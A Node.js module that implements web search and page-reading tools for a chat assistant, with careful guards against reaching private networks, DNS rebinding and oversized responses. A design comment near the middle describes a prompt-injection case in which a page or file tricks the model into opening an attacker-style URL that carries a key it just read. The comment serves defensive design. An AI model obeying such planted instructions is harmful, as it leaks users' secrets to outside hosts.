'use strict';

// Web tools for chat: search the web and read a page as text, so the assistant can research a
// question the way a person would. Both are read-only, so Basic mode runs them without asking,
// except web_open on an address the model made up itself, which could carry data out (see "Where
// data may go" below and `egressUrl` in lib/tool-loop.cjs).
//
// The ScaleMax API has no server-side search (checked 2026-09-28: a `web_search` tool is rejected,
// there is no `:online` model and no search endpoint), so ScaleMax searches itself through
// DuckDuckGo's HTML endpoint, which needs no key.
//
// Everything the model asks for is fetched in the main process with the same care as media
// downloads: http(s) only, no private or loopback addresses (so a reply cannot reach a router or a
// service on this machine), redirects followed by hand and re-checked, size and time limits, and
// HTML turned into plain text before the model sees it.

const dns = require('node:dns').promises;
const http = require('node:http');
const https = require('node:https');
const net = require('node:net');
const zlib = require('node:zlib');
const { Readable, pipeline } = require('node:stream');

const SERVER_ID = 'Web';
const SEARCH_URL = 'https://html.duckduckgo.com/html/';
const SEARCH_LITE_URL = 'https://lite.duckduckgo.com/lite/';
// A normal browser user agent; search pages answer differently without one.
const USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const LIMITS = {
  queryChars: 400,
  urlChars: 2048,
  results: 10,
  resultsMax: 15,
  snippetChars: 300,
  bytes: 5 * 1024 * 1024,
  timeoutMs: 20000,
  redirects: 3,
  pageChars: 40000,
  links: 25,
  titleChars: 200,
};

const BLOCKED_TAGS = /<(script|style|noscript|template|svg|head|iframe|object)\b[^>]*>[\s\S]*?<\/\1>/gi;
// `</li>` is left out: `<li>` already starts the line, so items stay one per line.
const BLOCK_END = /<\/(p|div|section|article|header|footer|main|aside|nav|tr|h[1-6]|pre|blockquote|figure|table|ul|ol|dl|dd|dt|form|label)\s*>/gi;
// A closing link becomes a space, so two links in a row do not glue their words together.
const LINK_END = /<\/a\s*>/gi;
const LINE_BREAK = /<(br|hr)\s*\/?>/gi;
const HEADING = /<h([1-6])\b[^>]*>/gi;
const LIST_ITEM = /<li\b[^>]*>/gi;
const TAG = /<[^>]+>/g;
const ENTITIES = {
  amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ', hellip: '…', mdash: '—', ndash: '–',
  lsquo: '\u2018', rsquo: '\u2019', ldquo: '\u201c', rdquo: '\u201d', middot: '·', bull: '•', copy: '©', reg: '®', trade: '™', deg: '°', euro: '€', pound: '£', times: '×', laquo: '«', raquo: '»', shy: '',
};

class WebToolError extends Error {
  constructor(message, code = 'WEB_TOOL') {
    super(message);
    this.name = 'WebToolError';
    this.code = code;
  }
}

function isRecord(value) {
  return value !== null && typeof value === 'object' && !Array.isArray(value);
}

function decodeEntities(text) {
  return text.replace(/&(#x?[0-9a-f]+|[a-z][a-z0-9]{1,9});/gi, (match, body) => {
    if (body[0] === '#') {
      const code = body[1] === 'x' || body[1] === 'X' ? Number.parseInt(body.slice(2), 16) : Number.parseInt(body.slice(1), 10);
      return Number.isInteger(code) && code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : match;
    }
    const known = ENTITIES[body.toLowerCase()];
    return known === undefined ? match : known;
  });
}

function clipText(text, chars) {
  return text.length > chars ? `${text.slice(0, chars - 1)}…` : text;
}

/** Visible text of an HTML fragment, on one line. */
function inlineText(html, chars) {
  return clipText(decodeEntities(String(html).replace(BLOCKED_TAGS, ' ').replace(TAG, ' ')).replace(/\s+/g, ' ').trim(), chars);
}

/** A whole page as readable plain text: headings kept, markup and scripts gone. */
function pageText(html) {
  const text = decodeEntities(html
    .replace(BLOCKED_TAGS, '\n')
    .replace(/<!--[\s\S]*?-->/g, ' ')
    .replace(LINE_BREAK, '\n')
    .replace(HEADING, (_match, level) => `\n\n${'#'.repeat(Number(level))} `)
    .replace(LIST_ITEM, '\n- ')
    .replace(BLOCK_END, '\n')
    .replace(LINK_END, ' ')
    .replace(TAG, ''));
  return text
    .split('\n')
    .map((line) => line.replace(/[ \t\u00a0]+/g, ' ').trim())
    .join('\n')
    .replace(/\n{3,}/g, '\n\n')
    .trim();
}

function pageTitle(html) {
  const match = /<title[^>]*>([\s\S]{0,400}?)<\/title>/i.exec(html);
  return match ? inlineText(match[1], LIMITS.titleChars) : '';
}

/** http(s) links of a page with their anchor text, absolute and deduplicated. */
function pageLinks(html, base) {
  const links = [];
  const seen = new Set();
  const pattern = /<a\b[^>]*href\s*=\s*["']([^"'#][^"']*)["'][^>]*>([\s\S]{0,300}?)<\/a>/gi;
  let match;
  while ((match = pattern.exec(html)) && links.length < LIMITS.links) {
    let url;
    try {
      url = new URL(decodeEntities(match[1]), base);
    } catch {
      continue;
    }
    if (url.protocol !== 'https:' && url.protocol !== 'http:') continue;
    url.hash = '';
    const href = url.toString();
    const label = inlineText(match[2], 120);
    if (!label || seen.has(href)) continue;
    seen.add(href);
    links.push({ url: href, label });
  }
  return links;
}

// Addresses are compared as bytes, never as text: the URL parser rewrites [::ffff:127.0.0.1] to
// [::ffff:7f00:1], and a text pattern for one spelling misses the other.
function ipv4Bytes(text) {
  const parts = String(text).split('.');
  if (parts.length !== 4) return null;
  const bytes = parts.map((part) => (/^\d{1,3}$/.test(part) ? Number(part) : -1));
  return bytes.every((byte) => byte >= 0 && byte <= 255) ? bytes : null;
}
function ipv6Bytes(text) {
  let value = String(text).toLowerCase().replace(/^\[|\]$/g, '');
  const zone = value.indexOf('%');
  if (zone >= 0) value = value.slice(0, zone);
  // A dotted IPv4 tail (::ffff:10.0.0.1) becomes its two hexadecimal groups.
  const tail = value.slice(value.lastIndexOf(':') + 1);
  if (tail.includes('.')) {
    const v4 = ipv4Bytes(tail);
    if (!v4) return null;
    value = `${value.slice(0, value.lastIndexOf(':') + 1)}${((v4[0] << 8) | v4[1]).toString(16)}:${((v4[2] << 8) | v4[3]).toString(16)}`;
  }
  const halves = value.split('::');
  if (halves.length > 2) return null;
  const head = halves[0] ? halves[0].split(':') : [];
  const rest = halves.length === 2 && halves[1] ? halves[1].split(':') : [];
  const missing = 8 - head.length - rest.length;
  if ((halves.length === 1 && missing !== 0) || (halves.length === 2 && missing < 1)) return null;
  const groups = [...head, ...Array(halves.length === 2 ? missing : 0).fill('0'), ...rest];
  const bytes = [];
  for (const group of groups) {
    if (!/^[0-9a-f]{1,4}$/.test(group)) return null;
    const number = Number.parseInt(group, 16);
    bytes.push(number >> 8, number & 0xff);
  }
  return bytes.length === 16 ? bytes : null;
}
// Not the public internet: this network, private, shared (CGNAT), loopback, link-local, IETF
// protocol assignments, documentation, benchmarking, the 6to4 relay, multicast, reserved, broadcast.
function privateIpv4([a, b, c]) {
  return a === 0 || a === 10 || a === 127 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31)
    || (a === 192 && b === 168) || (a === 100 && b >= 64 && b <= 127)
    || (a === 192 && b === 0 && (c === 0 || c === 2)) || (a === 192 && b === 88 && c === 99)
    || (a === 198 && (b === 18 || b === 19)) || (a === 198 && b === 51 && c === 100) || (a === 203 && b === 0 && c === 113)
    || a >= 224;
}
function privateIpv6(bytes) {
  const zero = (from, to) => bytes.slice(from, to).every((byte) => byte === 0);
  // IPv4-mapped (::ffff:0:0/96) and the old IPv4-compatible form (::/96, which covers :: and ::1).
  if (zero(0, 10) && bytes[10] === 0xff && bytes[11] === 0xff) return privateIpv4(bytes.slice(12));
  if (zero(0, 12)) return true;
  // NAT64 (64:ff9b::/96) carries an IPv4 address; the local-use prefix 64:ff9b:1::/48 is private.
  if (bytes[0] === 0x00 && bytes[1] === 0x64 && bytes[2] === 0xff && bytes[3] === 0x9b) {
    if (zero(4, 12)) return privateIpv4(bytes.slice(12));
    return true;
  }
  // 6to4 (2002::/16) carries an IPv4 address in its next 32 bits.
  if (bytes[0] === 0x20 && bytes[1] === 0x02) return privateIpv4(bytes.slice(2, 6));
  // IETF protocol assignments (2001:0000::/23: Teredo, ORCHID, …) and documentation (2001:db8::/32).
  if (bytes[0] === 0x20 && bytes[1] === 0x01 && bytes[2] <= 0x01) return true;
  if (bytes[0] === 0x20 && bytes[1] === 0x01 && bytes[2] === 0x0d && bytes[3] === 0xb8) return true;
  // Only global unicast (2000::/3) is the public internet; ULA, link-local, site-local,
  // multicast, discard and every reserved range are not.
  return (bytes[0] & 0xe0) !== 0x20;
}
/** True for any address that is not on the public internet (and for anything unreadable). */
function privateAddress(address) {
  const version = net.isIP(String(address).replace(/%.*$/, ''));
  if (version === 4) {
    const bytes = ipv4Bytes(address);
    return bytes ? privateIpv4(bytes) : true;
  }
  if (version === 6) {
    const bytes = ipv6Bytes(address);
    return bytes ? privateIpv6(bytes) : true;
  }
  return true;
}

/** The URL as a public web address, or an explanation of why it is refused. */
async function publicUrl(value, { lookup = dns.lookup } = {}) {
  let url;
  try {
    url = new URL(String(value).trim());
  } catch {
    throw new WebToolError('That is not a valid web address. Use a full URL such as https://example.com/page.', 'INVALID_URL');
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') throw new WebToolError('Only http and https addresses can be opened.', 'INVALID_URL');
  if (url.href.length > LIMITS.urlChars) throw new WebToolError('That address is too long.', 'INVALID_URL');
  if (url.username || url.password) throw new WebToolError('Addresses with a user name or password are not opened.', 'INVALID_URL');
  const host = url.hostname.replace(/^\[|\]$/g, '');
  if (/^(localhost|.*\.local|.*\.internal|.*\.localhost)$/i.test(host)) throw new WebToolError('Local addresses are not opened.', 'PRIVATE_ADDRESS');
  let addresses;
  if (net.isIP(host)) addresses = [{ address: host }];
  else {
    try {
      addresses = await lookup(host, { all: true });
    } catch {
      throw new WebToolError(`That site could not be found (${host}).`, 'DNS');
    }
  }
  if (!addresses.length || addresses.some((entry) => privateAddress(entry.address))) {
    throw new WebToolError('That address points into a private network, so it is not opened.', 'PRIVATE_ADDRESS');
  }
  return url;
}

function privateAddressError() {
  return new WebToolError('That address points into a private network, so it is not opened.', 'PRIVATE_ADDRESS');
}

/**
 * The lookup a connection makes, with every answer checked: checking a name first and letting the
 * connection look it up again would let a second DNS answer point somewhere private (rebinding).
 * Handles both calling styles of `net` (one address, or `all` for happy eyeballs).
 */
function guardedLookup(lookup, isPrivate = privateAddress) {
  return (hostname, options, callback) => {
    const done = typeof options === 'function' ? options : callback;
    const wantsAll = typeof options === 'object' && options !== null && options.all === true;
    Promise.resolve()
      .then(() => lookup(hostname, { all: true }))
      .then((answer) => {
        const entries = (Array.isArray(answer) ? answer : [answer]).filter((entry) => entry && typeof entry.address === 'string');
        if (!entries.length) throw new WebToolError(`That site could not be found (${hostname}).`, 'DNS');
        if (entries.some((entry) => isPrivate(entry.address))) throw privateAddressError();
        const list = entries.map((entry) => ({ address: entry.address, family: entry.family || net.isIP(entry.address) }));
        if (wantsAll) done(null, list);
        else done(null, list[0].address, list[0].family);
      })
      .catch((error) => done(error));
  };
}

const DECODERS = { gzip: () => zlib.createGunzip(), 'x-gzip': () => zlib.createGunzip(), deflate: () => zlib.createInflate(), br: () => zlib.createBrotliDecompress() };

/**
 * A small fetch for web_open and web_search: http(s) through Node's own client, so the connection
 * uses the address the guarded lookup checked, and the socket it ends up on is checked once more.
 * Answers with the parts of a fetch Response the tools use (status, ok, headers, body stream).
 */
function pinnedFetch(target, init = {}, { lookup = dns.lookup, isPrivate = privateAddress } = {}) {
  return new Promise((resolve, reject) => {
    let url;
    try {
      url = new URL(target);
    } catch (error) {
      reject(error);
      return;
    }
    const client = url.protocol === 'https:' ? https : url.protocol === 'http:' ? http : null;
    if (!client) {
      reject(new WebToolError('Only http and https addresses can be opened.', 'INVALID_URL'));
      return;
    }
    const request = client.request(url, {
      method: init.method || 'GET',
      headers: { ...(init.headers || {}), 'accept-encoding': 'gzip, deflate, br' },
      lookup: guardedLookup(lookup, isPrivate),
      signal: init.signal,
      // A fresh connection every time: a pooled one could belong to an address checked earlier.
      agent: false,
    }, (response) => {
      const encoding = String(response.headers['content-encoding'] || '').trim().toLowerCase();
      const decoder = DECODERS[encoding];
      // pipeline ends both sides together: a reader that stops early (the size cap, a redirect or
      // an error page) closes the connection too, not only the decoder.
      const stream = decoder ? pipeline(response, decoder(), () => {}) : response;
      stream.once('close', () => response.destroy());
      const headers = new Headers();
      for (const [name, value] of Object.entries(response.headers)) {
        if (Array.isArray(value)) value.forEach((item) => headers.append(name, item));
        else if (value !== undefined) headers.set(name, String(value));
      }
      if (decoder) headers.delete('content-encoding');
      const status = response.statusCode || 0;
      resolve({ status, ok: status >= 200 && status < 300, headers, body: Readable.toWeb(stream) });
    });
    // IP literals skip the lookup, and a proxy or a race could still land elsewhere: the socket
    // a request actually uses is checked too.
    request.on('socket', (socket) => {
      const check = () => {
        if (socket.remoteAddress && isPrivate(socket.remoteAddress)) request.destroy(privateAddressError());
      };
      if (socket.remoteAddress) check();
      else socket.once(url.protocol === 'https:' ? 'secureConnect' : 'connect', check);
    });
    request.on('error', reject);
    if (init.body) request.write(init.body);
    request.end();
  });
}

/** Lets go of a response whose body is not needed (a redirect or an error page). */
function discard(response) {
  try {
    const cancelled = response?.body?.cancel?.();
    if (cancelled && typeof cancelled.catch === 'function') cancelled.catch(() => {});
  } catch { /* nothing left to release */ }
}

/**
 * Fetches a page as text: redirects followed by hand (each one checked again), size and time
 * capped (the time limit covers the whole body, not only the headers), and only text answers
 * accepted.
 */
async function fetchPage(target, { fetchImpl = null, lookup = dns.lookup, method = 'GET', body = null, headers = {} } = {}) {
  const fetcher = typeof fetchImpl === 'function' ? fetchImpl : (address, init) => pinnedFetch(address, init, { lookup });
  let url = await publicUrl(target, { lookup });
  for (let hop = 0; hop <= LIMITS.redirects; hop += 1) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), LIMITS.timeoutMs);
    const timeoutText = `${url.host} did not answer within ${Math.round(LIMITS.timeoutMs / 1000)} seconds.`;
    try {
      let response;
      try {
        response = await fetcher(url.toString(), {
          method: hop === 0 ? method : 'GET',
          headers: {
            'user-agent': USER_AGENT,
            accept: 'text/html,application/xhtml+xml,application/json;q=0.9,text/plain;q=0.8,*/*;q=0.5',
            'accept-language': 'en-US,en;q=0.9',
            ...(hop === 0 ? headers : {}),
          },
          body: hop === 0 ? body : null,
          redirect: 'manual',
          signal: controller.signal,
        });
      } catch (error) {
        if (error instanceof WebToolError) throw error;
        throw new WebToolError(error?.name === 'AbortError' || controller.signal.aborted
          ? timeoutText
          : `${url.host} could not be reached (${error?.message || 'network error'}).`, 'FETCH_FAILED');
      }
      const location = response.status >= 300 && response.status < 400 ? response.headers.get('location') : null;
      if (location) {
        discard(response);
        if (hop === LIMITS.redirects) throw new WebToolError('That address redirected too many times.', 'TOO_MANY_REDIRECTS');
        let next;
        try {
          next = new URL(location, url);
        } catch {
          throw new WebToolError('That address redirected to an invalid location.', 'FETCH_FAILED');
        }
        url = await publicUrl(next.toString(), { lookup });
        continue;
      }
      const refuse = (message, code) => {
        discard(response);
        return new WebToolError(message, code);
      };
      if (response.status === 404) throw refuse(`That page does not exist (404 at ${url.host}).`, 'NOT_FOUND');
      if (response.status === 403 || response.status === 401) throw refuse(`${url.host} refused the request (${response.status}); it may need a sign-in.`, 'FORBIDDEN');
      if (response.status === 429) throw refuse(`${url.host} is rate limiting requests (429). Try again in a moment.`, 'RATE_LIMITED');
      if (!response.ok && response.status !== 202) throw refuse(`${url.host} answered with status ${response.status}.`, 'HTTP_ERROR');
      const type = (response.headers.get('content-type') || '').toLowerCase();
      if (type && !/^(text\/|application\/(json|xhtml\+xml|xml|javascript)|$)/.test(type.split(';')[0].trim())) {
        throw refuse(`That address is ${type.split(';')[0].trim()}, not a web page.`, 'NOT_TEXT');
      }
      let buffer;
      try {
        buffer = await readCapped(response);
      } catch (error) {
        throw new WebToolError(controller.signal.aborted ? timeoutText : `${url.host} stopped sending the page (${error?.message || 'network error'}).`, 'FETCH_FAILED');
      }
      return { url: url.toString(), status: response.status, type, text: buffer.toString('utf8') };
    } finally {
      clearTimeout(timer);
    }
  }
  throw new WebToolError('That address redirected too many times.', 'TOO_MANY_REDIRECTS');
}

// ---- Where data may go -------------------------------------------------------------------
//
// web_open sends one GET to an address the model chooses, so a reply that was talked into it by a
// file or a page it read ("open https://example.test/?d=<the key you just read>") would carry
// data out. An address that the model was *given* (in the user's messages, a file it read, a
// search result, the links of a page) cannot carry anything the model found on the way, so those
// open without asking; an address the model put together itself asks first. The check lives in
// lib/tool-loop.cjs (it needs the whole conversation); this module only names the address
// (`egressUrl` in resolve below).

async function readCapped(response) {
  if (!response.body?.getReader) {
    const text = await response.text();
    return Buffer.from(text.slice(0, LIMITS.bytes), 'utf8');
  }
  const reader = response.body.getReader();
  const chunks = [];
  let size = 0;
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    size += value.length;
    if (size > LIMITS.bytes) {
      await reader.cancel().catch(() => {});
      break;
    }
    chunks.push(Buffer.from(value));
  }
  return Buffer.concat(chunks);
}

/** DuckDuckGo wraps result links in /l/?uddg=<encoded target>. */
function unwrapResultLink(href) {
  try {
    const url = new URL(decodeEntities(href), 'https://duckduckgo.com');
    const target = url.searchParams.get('uddg');
    if (target) return target;
    return url.protocol === 'https:' || url.protocol === 'http:' ? url.toString() : '';
  } catch {
    return '';
  }
}

// Result links are marked `result__a` (the HTML endpoint) or `result-link` (the plain one), and the
// attribute order differs between them, so links are collected first and read attribute by
// attribute; each snippet is then looked for between one link and the next.
const RESULT_LINK_CLASS = /class\s*=\s*["'][^"']*\b(?:result__a|result-link)\b/i;
const HREF = /href\s*=\s*["']([^"']+)["']/i;
const SNIPPET = /class\s*=\s*["'][^"']*\bresult(?:__|-)snippet\b[^"']*["'][^>]*>([\s\S]{0,1500}?)<\/(?:a|td|div|span|p)>/i;
const ANCHORS_SCANNED = 60;
const SNIPPET_WINDOW = 3000;

function parseResults(html) {
  const anchors = [];
  const pattern = /<a\b([^>]*)>([\s\S]{0,400}?)<\/a>/gi;
  let match;
  while ((match = pattern.exec(html)) && anchors.length < ANCHORS_SCANNED) {
    if (!RESULT_LINK_CLASS.test(match[1])) continue;
    const href = HREF.exec(match[1])?.[1];
    if (href) anchors.push({ href, title: inlineText(match[2], LIMITS.titleChars), start: match.index, end: pattern.lastIndex });
  }
  const results = [];
  const seen = new Set();
  for (const [index, anchor] of anchors.entries()) {
    if (results.length >= LIMITS.resultsMax) break;
    const url = unwrapResultLink(anchor.href);
    if (!url || !anchor.title || seen.has(url)) continue;
    seen.add(url);
    const next = anchors[index + 1];
    const snippet = SNIPPET.exec(html.slice(anchor.end, next ? next.start : anchor.end + SNIPPET_WINDOW));
    results.push({ title: anchor.title, url, snippet: snippet ? inlineText(snippet[1], LIMITS.snippetChars) : '' });
  }
  return results;
}

const TOOLS = [
  {
    name: 'web_search',
    toolName: 'search',
    readOnly: true,
    description: 'Search the web and get a list of results (title, address, snippet). Use it for current information, documentation and facts you are not sure about, then open the most promising results with web_open.',
    parameters: {
      type: 'object',
      properties: {
        query: { type: 'string', description: 'What to search for, as you would type it into a search engine.' },
        count: { type: 'integer', minimum: 1, maximum: LIMITS.resultsMax, description: `How many results to return (default ${LIMITS.results}).` },
      },
      required: ['query'],
      additionalProperties: false,
    },
  },
  {
    name: 'web_open',
    toolName: 'open_page',
    readOnly: true,
    description: 'Open a web page and read it as text, with the links it contains. Long pages come in parts; pass the part number to read on. Use it to check a source instead of guessing what it says.',
    parameters: {
      type: 'object',
      properties: {
        url: { type: 'string', description: 'The full address, for example https://example.com/docs.' },
        part: { type: 'integer', minimum: 1, description: 'Which part of a long page to read (default 1).' },
      },
      required: ['url'],
      additionalProperties: false,
    },
  },
];

const BY_NAME = new Map(TOOLS.map((tool) => [tool.name, tool]));
const BY_TOOL = new Map(TOOLS.map((tool) => [tool.toolName, tool]));

/**
 * @param {{ fetchImpl?: typeof fetch, lookup?: Function }} [options] injection points for tests;
 *   without `fetchImpl` pages come through pinnedFetch (the checked address is the one used).
 */
function createWebTools({ fetchImpl = null, lookup = dns.lookup } = {}) {
  const io = { fetchImpl, lookup };

  async function search(args) {
    const query = typeof args.query === 'string' ? args.query.trim() : '';
    if (!query) throw new WebToolError('"query" must say what to search for.');
    if (query.length > LIMITS.queryChars) throw new WebToolError(`"query" must be at most ${LIMITS.queryChars} characters.`);
    const count = Number.isSafeInteger(args.count) ? Math.min(Math.max(args.count, 1), LIMITS.resultsMax) : LIMITS.results;
    const encoded = encodeURIComponent(query);
    let page = await fetchPage(`${SEARCH_URL}?q=${encoded}`, io);
    let results = parseResults(page.text);
    if (!results.length) {
      // The HTML endpoint sometimes answers with a holding page; the lite one is plainer.
      page = await fetchPage(`${SEARCH_LITE_URL}?q=${encoded}`, io);
      results = parseResults(page.text);
    }
    if (!results.length) {
      throw new WebToolError('The search engine returned no usable results. Try a different wording, or open a known address with web_open.', 'NO_RESULTS');
    }
    const lines = results.slice(0, count).map((result, index) => `${index + 1}. ${result.title}\n   ${result.url}${result.snippet ? `\n   ${result.snippet}` : ''}`);
    return `Search results for "${query}":\n${lines.join('\n')}\n\nOpen the useful ones with web_open to read them.`;
  }

  async function openPage(args) {
    if (typeof args.url !== 'string' || !args.url.trim()) throw new WebToolError('"url" must be a full web address.');
    const part = Number.isSafeInteger(args.part) && args.part > 0 ? args.part : 1;
    const page = await fetchPage(args.url, io);
    const json = /json/.test(page.type);
    const body = json ? page.text.trim() : pageText(page.text);
    if (!body) return `${page.url} has no readable text (it may need JavaScript).`;
    const total = Math.max(1, Math.ceil(body.length / LIMITS.pageChars));
    if (part > total) return `${page.url} has only ${total} part${total === 1 ? '' : 's'}.`;
    const slice = body.slice((part - 1) * LIMITS.pageChars, part * LIMITS.pageChars);
    const title = json ? '' : pageTitle(page.text);
    const head = [`${title ? `${title}\n` : ''}${page.url}`, total > 1 ? `Part ${part} of ${total}` : ''].filter(Boolean).join(' · ');
    const links = json || part > 1 ? [] : pageLinks(page.text, page.url);
    const more = part < total ? `\n\n[more: call web_open with part ${part + 1}]` : '';
    const linkList = links.length ? `\n\nLinks on this page:\n${links.map((link) => `- ${link.label}: ${link.url}`).join('\n')}` : '';
    return `${head}\n\n${slice}${more}${linkList}`;
  }

  const RUNNERS = { search, open_page: openPage };

  return {
    SERVER_ID,
    family: 'web',
    /** Both tools are always available: they need no folder and no key. */
    definitions() {
      return TOOLS.map((tool) => ({
        type: 'function',
        function: { name: tool.name, description: tool.description, parameters: structuredClone(tool.parameters) },
      }));
    },
    resolve(name) {
      const tool = typeof name === 'string' ? BY_NAME.get(name) : undefined;
      if (!tool) return null;
      const target = { serverId: SERVER_ID, toolName: tool.toolName, readOnly: tool.readOnly };
      // The address a page request goes to; the tool loop asks first when the model made it up.
      // A search goes only to the search engine, so it has none.
      if (tool.toolName === 'open_page') target.egressUrl = (args) => (isRecord(args) && typeof args.url === 'string' ? args.url : null);
      return target;
    },
    async call(toolName, args) {
      const tool = BY_TOOL.get(toolName);
      if (!tool) throw new WebToolError(`Unknown web tool: ${toolName}`);
      return { text: await RUNNERS[tool.toolName](isRecord(args) ? args : {}) };
    },
    /** A one-line title for a step in the reply. */
    describeCall(toolName, args) {
      const value = isRecord(args) ? args : {};
      const text = (item) => (typeof item === 'string' ? item.trim().replace(/\s+/g, ' ').slice(0, 120) : '');
      if (toolName === 'search') return text(value.query) ? `Searched the web for "${text(value.query)}"` : 'Searched the web';
      if (toolName === 'open_page') return text(value.url) ? `Read ${text(value.url)}` : 'Read a web page';
      return toolName;
    },
  };
}

module.exports = {
  createWebTools, SERVER_ID, TOOLS, LIMITS, WebToolError, pageText, pageLinks, pageTitle, parseResults, publicUrl, privateAddress,
  decodeEntities, pinnedFetch, guardedLookup,
};
